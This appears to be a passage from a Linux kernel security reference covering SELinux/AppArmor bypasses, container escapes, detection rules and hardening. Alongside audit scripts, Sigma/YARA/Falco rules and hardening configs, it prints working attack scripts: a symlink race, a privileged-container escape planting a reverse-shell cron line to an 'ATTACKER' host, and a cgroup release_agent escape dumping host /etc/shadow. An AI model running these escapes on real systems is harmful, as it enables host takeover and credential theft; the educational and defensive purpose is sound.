1. **`unconfined_t` domain.** Processes running as `unconfined_t` are not restricted by SELinux type enforcement. Check: `ps -eZ | grep unconfined_t`. Common on RHEL/Fedora where user sessions run unconfined by default. Exploitation: if an attacker compromises an `unconfined_t` process, SELinux provides no containment.

2. **Permissive mode.** `getenforce` returns `Permissive` — SELinux logs but does not enforce. Per-domain permissive: `semanage permissive -l` lists domains in permissive mode. Exploitation: target permissive domains for unrestricted operations while the rest of the system is enforcing.

3. **Boolean abuse.** Enabling `httpd_execmem` allows the httpd domain to create W+X memory mappings — a prerequisite for most shellcode execution techniques. An attacker who can toggle booleans (via `CAP_MAC_ADMIN` or a vulnerable management interface) can weaken policy at runtime.

4. **Label manipulation.** If an attacker can relabel files (`chcon`, `restorecon`, or write to `security.selinux` xattr with `CAP_MAC_ADMIN`), they can change a file's type to one their domain can access. Example: `chcon -t httpd_content_t /etc/shadow` — now `httpd_t` can read shadow (if `allow httpd_t httpd_content_t:file read` exists in policy).

**AppArmor profile bypass via symlink race.** AppArmor is path-based. If a confined process opens `/var/log/app/data.log` (allowed), and an attacker replaces `/var/log/app` with a symlink to `/etc` between the path check and the actual open, the process may open `/etc/shadow` instead. The race window is narrow but exploitable in high-frequency file operations:

```bash
#!/bin/bash
# Symlink race against AppArmor path-based policy
# Target: process confined to write only /var/log/app/*
# Goal:   trick it into writing to /etc/crontab

TARGET_DIR="/var/log/app"
LINK_TARGET="/etc"

while true; do
    # Create legitimate directory
    rm -rf "$TARGET_DIR" 2>/dev/null
    mkdir -p "$TARGET_DIR"
    # Wait for target process to start path resolution
    sleep 0.001
    # Replace with symlink during race window
    rm -rf "$TARGET_DIR"
    ln -s "$LINK_TARGET" "$TARGET_DIR"
done
# In parallel, trigger the confined process to write to
# /var/log/app/crontab — which resolves to /etc/crontab
```

Mitigation: AppArmor's `owner` qualifier and kernel's `protected_symlinks` sysctl (`fs.protected_symlinks = 1`, enabled by default since Linux 3.6) significantly narrow this race. The sysctl prevents following symlinks in world-writable sticky directories when the symlink and follower have different owners.

**Landlock network port restriction (ABI v4).** Complements the filesystem sandbox in §5.7 with network control:

```c
#include <linux/landlock.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>

int main(void) {
    /* Check ABI version — need v4+ for network rules */
    int abi = syscall(SYS_landlock_create_ruleset, NULL, 0,
                      LANDLOCK_CREATE_RULESET_VERSION);
    if (abi < 4) {
        fprintf(stderr, "Landlock ABI %d < 4, no network support\n", abi);
        return 1;
    }

    struct landlock_ruleset_attr attr = {
        .handled_access_net =
            LANDLOCK_ACCESS_NET_BIND_TCP |
            LANDLOCK_ACCESS_NET_CONNECT_TCP,
    };
    int rs = syscall(SYS_landlock_create_ruleset, &attr, sizeof(attr), 0);

    /* Allow binding only to port 8080 */
    struct landlock_net_port_attr port_rule = {
        .allowed_access = LANDLOCK_ACCESS_NET_BIND_TCP,
        .port = 8080,
    };
    syscall(SYS_landlock_add_rule, rs,
            LANDLOCK_RULE_NET_PORT, &port_rule, 0);

    /* Allow outbound connections only to port 443 */
    port_rule.allowed_access = LANDLOCK_ACCESS_NET_CONNECT_TCP;
    port_rule.port = 443;
    syscall(SYS_landlock_add_rule, rs,
            LANDLOCK_RULE_NET_PORT, &port_rule, 0);

    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    syscall(SYS_landlock_restrict_self, rs, 0);
    close(rs);

    /* Process can now only bind TCP :8080 and connect TCP :443.
       All other bind/connect attempts return -EACCES.
       Stacks with SELinux/AppArmor — most restrictive wins. */
    printf("[+] Landlock network sandbox active\n");
    return 0;
}
```

**LSM bypass via kernel vulnerability.** The fundamental limitation of all LSMs: they enforce policy through kernel hooks, but a kernel memory corruption vulnerability can overwrite the `struct cred` security blob or the LSM hook function pointers themselves. CVE-2021-33909 ("Sequoia") demonstrated this — a filesystem path length integer overflow allowed overwriting `struct cred`, changing the SELinux context to `unconfined_t`. Any exploit that achieves arbitrary kernel write can similarly neutralize LSM enforcement by: (1) modifying `current->cred->security` to an unconfined label; (2) overwriting LSM hook entries to point to a function that always returns 0 (allow); (3) disabling the LSM entirely by clearing the `security_hook_heads` list. This is why kernel memory safety (KASAN, KFENCE, CFI, stack protector — §§6.4–6.7) is prerequisite to LSM effectiveness.

### 6D. Container security

**Docker capability audit script:**

```bash
#!/bin/bash
# docker_cap_audit.sh — Audit running containers for dangerous capabilities
echo "=== Docker Container Capability Audit ==="

for cid in $(docker ps -q); do
    name=$(docker inspect --format '{{.Name}}' "$cid" | tr -d '/')
    echo -e "\n--- Container: $name ($cid) ---"

    # Check if privileged
    priv=$(docker inspect --format '{{.HostConfig.Privileged}}' "$cid")
    [ "$priv" = "true" ] && echo "  [CRITICAL] Running privileged"

    # List added capabilities
    caps_add=$(docker inspect --format '{{.HostConfig.CapAdd}}' "$cid")
    [ "$caps_add" != "[]" ] && [ -n "$caps_add" ] && \
        echo "  [WARN] Added caps: $caps_add"

    # List dropped capabilities
    caps_drop=$(docker inspect --format '{{.HostConfig.CapDrop}}' "$cid")
    echo "  Dropped caps: ${caps_drop:-none}"

    # Check PID namespace sharing
    pid_mode=$(docker inspect --format '{{.HostConfig.PidMode}}' "$cid")
    [ "$pid_mode" = "host" ] && echo "  [CRITICAL] Shares host PID namespace"

    # Check network mode
    net_mode=$(docker inspect --format '{{.HostConfig.NetworkMode}}' "$cid")
    [ "$net_mode" = "host" ] && echo "  [HIGH] Shares host network namespace"

    # Check seccomp profile
    seccomp=$(docker inspect --format '{{.HostConfig.SecurityOpt}}' "$cid")
    echo "$seccomp" | grep -q "unconfined" && \
        echo "  [HIGH] Seccomp disabled (unconfined)"

    # Check read-only rootfs
    ro=$(docker inspect --format '{{.HostConfig.ReadonlyRootfs}}' "$cid")
    [ "$ro" != "true" ] && echo "  [INFO] Rootfs is writable"

    # Check sensitive mounts
    mounts=$(docker inspect --format '{{range .Mounts}}{{.Source}}:{{.Destination}} {{end}}' "$cid")
    echo "$mounts" | grep -qE "/var/run/docker.sock|/proc|/sys" && \
        echo "  [CRITICAL] Sensitive host path mounted: $mounts"
done
```

**Privileged container escape.** `--privileged` grants all capabilities, disables seccomp, disables AppArmor, and mounts the host's `/dev` devices:

```bash
#!/bin/bash
# Escape from a --privileged container
# Method 1: mount host disk
fdisk -l 2>/dev/null  # find host disks
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host 2>/dev/null && {
    echo "[+] Host filesystem mounted"
    # Install backdoor
    echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'" \
        >> /mnt/host/etc/crontab
}

# Method 2: nsenter to host namespaces
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

**Seccomp bypass.** Containers with `--security-opt seccomp=unconfined` or custom profiles that allow dangerous syscalls:

```bash
# Check if seccomp is active from inside a container
grep Seccomp /proc/self/status
# Seccomp: 0 = disabled, 1 = strict, 2 = filter

# If seccomp is disabled, all syscalls are available:
# mount, ptrace, kexec_load, bpf, userfaultfd, etc.
# These are the syscalls Docker's default profile blocks
```

**Cgroup escape via `release_agent` (CVE-2022-0492).** The full mechanism is described in §4.4. Exploitation script for cgroups v1:

```bash
#!/bin/bash
# Requires: CAP_SYS_ADMIN inside container, cgroups v1
# The container must be able to mount a cgroup hierarchy

# Step 1: mount cgroup v1 hierarchy
mkdir -p /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || \
mount -t cgroup -o memory cgroup /tmp/cgrp

# Step 2: create a child cgroup
mkdir /tmp/cgrp/escape

# Step 3: set release_agent to a command that runs on the HOST
# Find the container's path on the host filesystem
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host_path/cmd.sh" > /tmp/cgrp/release_agent

# Step 4: write the escape payload
cat > /cmd.sh << 'PAYLOAD'
#!/bin/bash
# This runs as root on the HOST when release_agent fires
cat /etc/shadow > /output
PAYLOAD
chmod +x /cmd.sh

# Step 5: enable notify_on_release
echo 1 > /tmp/cgrp/escape/notify_on_release

# Step 6: trigger — put a process in the cgroup and let it exit
echo $$ > /tmp/cgrp/escape/cgroup.procs
# The shell PID is now in the cgroup; spawning a child that exits
# triggers release_agent on the host
bash -c 'echo $$ > /tmp/cgrp/escape/cgroup.procs && exit'

# Step 7: check for output
sleep 1
cat /output 2>/dev/null
```

**Container breakout checklist:**

| Check | Command | Escape if |
|-------|---------|-----------|
| Privileged mode | `cat /proc/self/status \| grep CapEff` | `CapEff: 000001ffffffffff` (all caps) |
| Docker socket | `ls -la /var/run/docker.sock` | Socket is mounted |
| Host PID ns | `ps aux \| grep -c ""` vs host | Process counts match |
| Host net ns | `ip addr \| grep docker0` | Host interfaces visible |
| Sensitive mounts | `mount \| grep -E '/dev/sd\|/proc/.*host'` | Host devices/paths mounted |
| Seccomp disabled | `grep Seccomp /proc/self/status` | `Seccomp: 0` |
| AppArmor disabled | `cat /proc/self/attr/current` | `unconfined` |
| Writable cgroup | `mount \| grep cgroup.*rw` | Cgroup fs writable |
| CAP_SYS_ADMIN | `capsh --print \| grep sys_admin` | Present in effective set |
| core_pattern | `cat /proc/sys/kernel/core_pattern` | Writable, pipe to host binary |

**Kubernetes Pod Security Standards (PSS).** K8s v1.25+ enforces security profiles via the Pod Security Admission controller:

| Profile | Caps | Volumes | Host NS | Privilege escalation |
|---------|------|---------|---------|---------------------|
| **Privileged** | All | All | Allowed | Allowed |
| **Baseline** | Drop ALL, add subset | No hostPath | No host PID/net/IPC | `allowPrivilegeEscalation: false` recommended |
| **Restricted** | Drop ALL only | emptyDir, configMap, secret, PVC | Denied | `runAsNonRoot: true`, `readOnlyRootFilesystem: true` |

Enforcement via namespace labels:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

### 6E. Detection

**Sigma rules — capability escalation, namespace creation, SELinux permissive:**

```yaml
# Sigma: Suspicious capability escalation
title: Capability Set Modification
status: experimental
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: SYSCALL
    syscall:
      - capset
      - prctl
    a0|contains:
      - "PR_CAP_AMBIENT"
      - "PR_CAPBSET_DROP"
  condition: selection
level: high
tags:
  - attack.privilege_escalation
  - attack.t1068
---
# Sigma: Namespace creation by non-root
title: User Namespace Creation by Unprivileged User
status: experimental
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: SYSCALL
    syscall:
      - unshare
      - clone
      - clone3
    a0|contains: "CLONE_NEWUSER"
  filter:
    uid: "0"
  condition: selection and not filter
level: high
tags:
  - attack.defense_evasion
  - attack.t1611
---
# Sigma: SELinux switched to permissive
title: SELinux Permissive Mode Activation
status: experimental
logsource:
  product: linux
  service: auditd
detection:
  selection_cmd:
    type: EXECVE
    a0|endswith:
      - setenforce
    a1: "0"
  selection_audit:
    type: MAC_STATUS
    enforcing: "0"
  condition: selection_cmd or selection_audit
level: critical
tags:
  - attack.defense_evasion
  - attack.t1562
```

**YARA rules:**

```yara
rule container_escape_tools {
    meta:
        description = "Detects known container escape tool artifacts"
        severity = "critical"
    strings:
        $deepce    = "deepce" ascii wide
        $botb      = "break-out-the-box" ascii wide
        $cdk       = "CDK - Zero Dependency Container Penetration Toolkit" ascii
        $peirates  = "peirates" ascii wide
        $amicontained = "amicontained" ascii wide
        $release_agent = "release_agent" ascii
        $notify_release = "notify_on_release" ascii
        $nsenter_cmd = "nsenter --target 1" ascii
    condition:
        any of ($deepce, $botb, $cdk, $peirates, $amicontained) or
        ($release_agent and $notify_release) or
        $nsenter_cmd
}

rule namespace_manipulation_binary {
    meta:
        description = "Binary performing namespace manipulation syscalls"
        severity = "high"
    strings:
        $unshare_call  = { b8 10 01 00 00 }  /* mov eax, 0x110 (unshare) x86_64 */
        $setns_call    = { b8 08 01 00 00 }  /* mov eax, 0x108 (setns) x86_64 */
        $clone_newuser = "CLONE_NEWUSER" ascii
        $clone_newns   = "CLONE_NEWNS" ascii
        $proc_ns       = "/proc/%d/ns/" ascii
        $proc_1_ns     = "/proc/1/ns/" ascii
    condition:
        (($unshare_call or $setns_call) and
         ($clone_newuser or $clone_newns)) or
        $proc_1_ns
}

rule capability_exploitation_binary {
    meta:
        description = "Binary manipulating Linux capabilities for exploitation"
        severity = "high"
    strings:
        $capset_call   = "capset" ascii
        $capget_call   = "capget" ascii
        $ambient_raise = "PR_CAP_AMBIENT_RAISE" ascii
        $sys_admin     = "CAP_SYS_ADMIN" ascii
        $sys_ptrace    = "CAP_SYS_PTRACE" ascii
        $sys_module    = "CAP_SYS_MODULE" ascii
        $ptrace_poke   = "PTRACE_POKETEXT" ascii
        $mount_sda     = "/dev/sda" ascii
    condition:
        ($capset_call and ($ambient_raise or $sys_admin)) or
        ($sys_ptrace and $ptrace_poke) or
        ($sys_module and $mount_sda)
}
```

**Auditd rules for capability and namespace monitoring:**

```
## /etc/audit/rules.d/caps-ns.rules

# Monitor capability set modifications
-a always,exit -F arch=b64 -S capset -k cap_modification
-a always,exit -F arch=b64 -S prctl -F a0=47 -k ambient_cap_change
-a always,exit -F arch=b64 -S prctl -F a0=24 -k bounding_set_drop

# Monitor namespace creation
-a always,exit -F arch=b64 -S unshare -k namespace_create
-a always,exit -F arch=b64 -S setns -k namespace_enter
-a always,exit -F arch=b64 -S clone -F a0&0x10000000 -k clone_newuser
-a always,exit -F arch=b64 -S clone3 -k clone3_call

# Monitor mount operations (container escape indicator)
-a always,exit -F arch=b64 -S mount -F auid!=4294967295 -k mount_op
-a always,exit -F arch=b64 -S pivot_root -k pivot_root

# Monitor SELinux state changes
-w /etc/selinux/ -p wa -k selinux_config
-w /usr/sbin/setenforce -p x -k selinux_enforce
-w /usr/sbin/semanage -p x -k selinux_manage
-w /usr/sbin/setsebool -p x -k selinux_bool

# Monitor cgroup writes (release_agent abuse)
-w /sys/fs/cgroup/ -p wa -k cgroup_write

# Monitor kernel module loading
-a always,exit -F arch=b64 -S init_module -S finit_module -k module_load
-a always,exit -F arch=b64 -S delete_module -k module_unload
```

**Falco container escape detection rules:**

```yaml
# /etc/falco/rules.d/container_escape.yaml

- rule: Container Escape via release_agent
  desc: Writing to cgroup release_agent from within a container
  condition: >
    container and
    open_write and
    fd.name endswith "release_agent"
  output: >
    Container escape attempt via release_agent
    (user=%user.name container=%container.name file=%fd.name)
  priority: CRITICAL
  tags: [container, escape, cve-2022-0492]

- rule: Namespace Enter from Container
  desc: Process inside container using nsenter or setns to host namespaces
  condition: >
    container and
    (spawned_process and proc.name = "nsenter") or
    (syscall.type = setns)
  output: >
    Namespace escape attempt from container
    (user=%user.name container=%container.name proc=%proc.cmdline)
  priority: CRITICAL
  tags: [container, escape, namespace]

- rule: Privileged Container Started
  desc: A container started with --privileged flag
  condition: >
    container and
    evt.type = container and
    container.privileged = true
  output: >
    Privileged container started
    (image=%container.image.repository container=%container.name)
  priority: HIGH
  tags: [container, privileged]

- rule: Mount Host Filesystem in Container
  desc: Container process mounting a block device
  condition: >
    container and
    syscall.type = mount and
    fd.name startswith "/dev/sd"
  output: >
    Container mounting host device
    (user=%user.name container=%container.name device=%fd.name)
  priority: CRITICAL
  tags: [container, escape, mount]
```

### 6F. Hardening

**systemd `CapabilityBoundingSet` — restrict service capabilities:**

```ini
# /etc/systemd/system/myservice.service
[Service]
# Drop all capabilities, grant only what's needed
CapabilityBoundingSet=CAP_NET_BIND_SERVICE CAP_CHOWN CAP_SETUID CAP_SETGID
AmbientCapabilities=CAP_NET_BIND_SERVICE

# Additional hardening
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
PrivateTmp=yes
PrivateDevices=yes
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectKernelLogs=yes
RestrictNamespaces=yes
RestrictSUIDSGID=yes
SystemCallFilter=@system-service
SystemCallArchitectures=native
MemoryDenyWriteExecute=yes
LockPersonality=yes
```

**Sysctl hardening for namespaces and capabilities:**

```bash
# /etc/sysctl.d/90-security.conf

# Restrict unprivileged user namespace creation
user.max_user_namespaces = 0
# Or set to a low value if rootless containers needed:
# user.max_user_namespaces = 10

# Disable unprivileged BPF (prevents BPF-based namespace attacks)
kernel.unprivileged_bpf_disabled = 1

# Restrict dmesg to CAP_SYSLOG (prevents KASLR leak)
kernel.dmesg_restrict = 1

# Enable symlink/hardlink protections
fs.protected_symlinks = 1
fs.protected_hardlinks = 1
fs.protected_fifos = 2
fs.protected_regular = 2

# Restrict perf_event access
kernel.perf_event_paranoid = 3

# Restrict kernel pointer exposure
kernel.kptr_restrict = 2

# ptrace scope (Yama)
# 0 = no restriction, 1 = parent only, 2 = admin only, 3 = disabled
kernel.yama.ptrace_scope = 2
```

**SELinux enforcing deployment:**

```bash
# Verify and set enforcing mode
getenforce
setenforce 1

# Make persistent across reboots
sed -i 's/^SELINUX=.*/SELINUX=enforcing/' /etc/selinux/config

# Audit for permissive domains — each is a containment gap
semanage permissive -l
# Remove permissive exceptions:
semanage permissive -d httpd_t

# Verify no unconfined processes in sensitive contexts
ps -eZ | grep unconfined_t | grep -v "kernel\|init"

# Relabel filesystem if needed after policy changes
touch /.autorelabel && reboot
```

**AppArmor profile for a container workload:**

```
#include <tunables/global>

profile container-webapp flags=(attach_disconnected,mediate_deleted) {
    #include <abstractions/base>

    # Filesystem access
    /app/** r,
    /app/bin/* ix,
    /tmp/** rw,
    /var/log/app/** w,

    # Network
    network inet tcp,
    network inet6 tcp,

    # Deny sensitive operations
    deny mount,
    deny umount,
    deny pivot_root,
    deny /proc/*/ns/* rw,
    deny /sys/fs/cgroup/**/release_agent w,
    deny /proc/sysrq-trigger w,
    deny /proc/sys/** w,

    # Deny capabilities
    deny capability sys_admin,
    deny capability sys_ptrace,
    deny capability sys_module,
    deny capability sys_rawio,
    deny capability mac_override,

    # Deny namespace creation
    deny /proc/*/setgroups w,
    deny /proc/*/uid_map w,
    deny /proc/*/gid_map w,
}
```

**Cgroup resource limits — defense against DoS:**

```bash
# systemd cgroup limits for a service
systemctl set-property myservice.service \
    MemoryMax=512M \
    MemoryHigh=400M \
    CPUQuota=150% \
    TasksMax=100 \
    IOWriteBandwidthMax="/dev/sda 50M"

# Kubernetes: enforce via LimitRange
cat <<'EOF' | kubectl apply -f -
apiVersion: v1
kind: LimitRange
metadata:
  name: default-limits
  namespace: production
spec:
  limits:
  - default:
      memory: 512Mi
      cpu: "1"
    defaultRequest:
      memory: 256Mi
      cpu: 250m
    max:
      memory: 2Gi
      cpu: "4"
    type: Container
EOF
```

**Landlock deployment for production services.** Combine with the network example in §6C and the filesystem example in §5.7. A production deployment sets `PR_SET_NO_NEW_PRIVS` before restricting, and handles ABI version negotiation for backward compatibility (see §5.7 for ABI versioning details).

**Hardening summary table:**

| Layer | Hardening measure | Config location | Threat mitigated |
|-------|-------------------|-----------------|------------------|
| Capabilities | `CapabilityBoundingSet=` | systemd unit file | Excessive privilege |
| Capabilities | `--cap-drop=ALL --cap-add=...` | Docker CLI / Compose | Container privilege |
| Namespaces | `user.max_user_namespaces=0` | `/etc/sysctl.d/` | Kernel attack surface via userns |
| Namespaces | `RestrictNamespaces=yes` | systemd unit file | Service namespace abuse |
| SELinux | `SELINUX=enforcing` | `/etc/selinux/config` | MAC bypass |
| AppArmor | Per-service profiles | `/etc/apparmor.d/` | Unconfined processes |
| Cgroups | `MemoryMax`, `TasksMax` | systemd / K8s spec | Resource exhaustion DoS |
| Seccomp | Default Docker profile | Built-in | Dangerous syscall access |
| Landlock | Self-sandbox in application | Application code | Process file/network scope |
| Kernel | `kernel.unprivileged_bpf_disabled=1` | `/etc/sysctl.d/` | BPF-based exploits |
| Kernel | `kernel.yama.ptrace_scope=2` | `/etc/sysctl.d/` | Cross-process ptrace |
| Kernel | `lockdown=integrity` | Boot parameter | Runtime kernel tampering |

### 6G. CVE reference table

| CVE | Year | Component | CVSS | Summary | Exploitation |
|-----|------|-----------|------|---------|--------------|
| CVE-2022-0185 | 2022 | User namespace + `fs_context` | 8.4 | Heap overflow in `legacy_parse_param` reachable via user namespace `CAP_SYS_ADMIN`. `fsconfig()` with oversized parameter corrupts heap → arbitrary kernel write. | §3.4, §6B |
| CVE-2022-0492 | 2022 | Cgroup v1 `release_agent` | 7.8 | Container with `CAP_SYS_ADMIN` writes cgroup `release_agent` → host executes arbitrary command as root. Missing namespace check on `release_agent` write. | §4.4, §6D |
| CVE-2019-5736 | 2019 | runc (container runtime) | 8.6 | Overwrite host runc binary via `/proc/self/exe` from within container during `docker exec`. Malicious container image replaces runc → next `docker exec/run` executes attacker code as root on host. | Requires `docker exec` trigger. Patched in runc 1.0.0-rc6+. |
| CVE-2024-21626 | 2024 | runc — Leaky Vessels | 8.6 | File descriptor leak allows container process to access host filesystem via leaked fd. `WORKDIR` directive in Dockerfile pointing to `/proc/self/fd/N` escapes container. | Requires crafted Dockerfile. Patched in runc 1.1.12. |
| CVE-2024-23651 | 2024 | BuildKit — Leaky Vessels | 8.7 | Race condition in BuildKit mount cache allows build-time container escape. Concurrent builds with shared cache mounts can access each other's filesystems. | Build-time attack. Patched in BuildKit 0.12.5. |
| CVE-2024-23652 | 2024 | BuildKit — Leaky Vessels | 9.8 | Arbitrary host file deletion during build via symlink in mount teardown path. `RUN --mount` with crafted symlinks deletes files outside the build context. | Build-time attack. Patched in BuildKit 0.12.5. |
| CVE-2022-23222 | 2022 | eBPF verifier | 7.8 | Type confusion in BPF verifier on pointer arithmetic → arbitrary kernel read/write. Reachable via `CAP_BPF` in user namespace (before `unprivileged_bpf_disabled`). | Load crafted BPF prog from userns. |
| CVE-2022-25636 | 2022 | nf_tables via user namespace | 7.8 | Heap out-of-bounds write in netfilter `nf_tables` reachable from user namespace with `CAP_NET_ADMIN`. OOB write in `nft_fwd_dup_netdev_offload` → privilege escalation. | Create userns → nft rule with offload. |
| CVE-2023-32233 | 2023 | nf_tables via user namespace | 7.8 | Use-after-free in nf_tables anonymous set handling. Batch requests manipulating anonymous sets trigger UAF → arbitrary kernel write. Reachable from userns. | nft batch request from userns. |
| CVE-2023-3269 | 2023 | Kernel VMA (StackRot) | 7.8 | Use-after-free in maple tree VMA handling during stack expansion. Not namespace-specific but exploitable from containers with default capabilities. | Stack expansion race condition. |
| CVE-2021-31440 | 2021 | eBPF verifier | 7.0 | Bounds tracking bypass in BPF verifier for 32-bit ALU operations → arbitrary kernel read/write. Required `CAP_BPF` or `CAP_SYS_ADMIN` (user namespace sufficient). | Load crafted BPF prog. |
| CVE-2016-5195 | 2016 | Kernel mm (Dirty COW) | 7.8 | Race condition in COW page handling allows write to read-only mappings. Not namespace-specific but commonly used for container escape by overwriting `/etc/passwd` or setuid binaries. | madvise + write race on `/proc/self/mem`. |
| CVE-2020-14386 | 2020 | `AF_PACKET` socket | 7.8 | Memory corruption in `AF_PACKET` (raw socket) `tpacket_rcv`. Requires `CAP_NET_RAW` — granted by default in Docker before v20.10. Heap overflow → privilege escalation. | Open `AF_PACKET` socket with crafted ring buffer. |

---

## 7. Cross-references

**To Chapter 2A (process memory):** The `vm_flags` on VMAs (§2.3) are the software-level permissions that capabilities and LSMs gate. `mmap_min_addr` (§3.1) is an early example of a kernel-wide security policy. The KPTI discussion (§10.3) is the page-table-level complement to the `pageattr` mechanism here. `/dev/mem` and `/dev/kmem` restrictions (§12) are part of the same chain as `CONFIG_STRICT_DEVMEM` and Lockdown. KASAN's shadow memory mapping (§6.5) lives in the same kernel virtual address space described in 2A §5.

**To Chapter 2B (syscall dispatch, seccomp, ptrace):** Capabilities gate who can install seccomp filters without `PR_SET_NO_NEW_PRIVS`. Capabilities gate ptrace access (`CAP_SYS_PTRACE` bypasses Yama and UID checks). User namespaces interact with seccomp's `SECCOMP_FILTER_FLAG_NEW_LISTENER` (the supervisor must be in a parent or same namespace). `io_uring`'s security problems are partly addressed by cgroup-level BPF device policies. Landlock and seccomp together form a comprehensive unprivileged sandboxing stack: seccomp for syscall filtering, Landlock for filesystem/network access. The securebits (`PR_SET_SECUREBITS`) interact with seccomp's `SECCOMP_RET_ALLOW` vs `SECCOMP_RET_ERRNO` decisions when capability-bearing programs are involved.

**To the attack taxonomy (Section 1):** Container escapes exploit capability misconfigurations (e.g., `CAP_SYS_ADMIN` in a container), namespace boundary violations (e.g., mount propagation, user namespace kernel attack surface), cgroup `release_agent` abuse, and LSM bypass. The defense architecture is capabilities + namespaces + cgroups + seccomp + LSM + user namespace restrictions, all layered. A thorough container security audit checks every layer. The KFENCE and KASAN mechanisms (§6.4–6.5) detect the memory corruption bugs that underlie many of the CVEs discussed here.

**To Domain 1 (binary formats):** File capabilities (§1.3) are stored in the `security.capability` extended attribute on ELF executables and are consulted during the `execve` path (Domain 1, Chapter 1A §5). IMA's appraisal (§5.8) hashes the same ELF binary that the loader parses. SELinux file contexts label the same files that the ELF sections describe. The VFS_CAP_REVISION_3 format (§1.3) ties file capabilities to user namespaces, intersecting with both the ELF loading path and the namespace material in §3.4.

**Layered defense model.** The mechanisms in this chapter form the complete container isolation stack. Reading bottom-up: `pageattr` + `STRICT_KERNEL_RWX` protect the kernel itself from code modification. KFENCE/KASAN detect the memory bugs that would allow such modification. The `lockdown` LSM blocks userspace avenues for kernel tampering. SELinux/AppArmor enforce mandatory access control on all kernel interfaces. Seccomp (Chapter 2B) restricts which system calls can reach the kernel. Capabilities limit which privileged operations a process can request. Namespaces partition the kernel's resource views. Cgroups limit resource consumption. Landlock provides per-process sandboxing without admin privilege. A comprehensive security assessment of a container environment must verify each layer independently — a weakness in any one layer may be exploitable if the others are configured to compensate, but defense in depth assumes that multiple layers will be tested simultaneously by a skilled attacker.
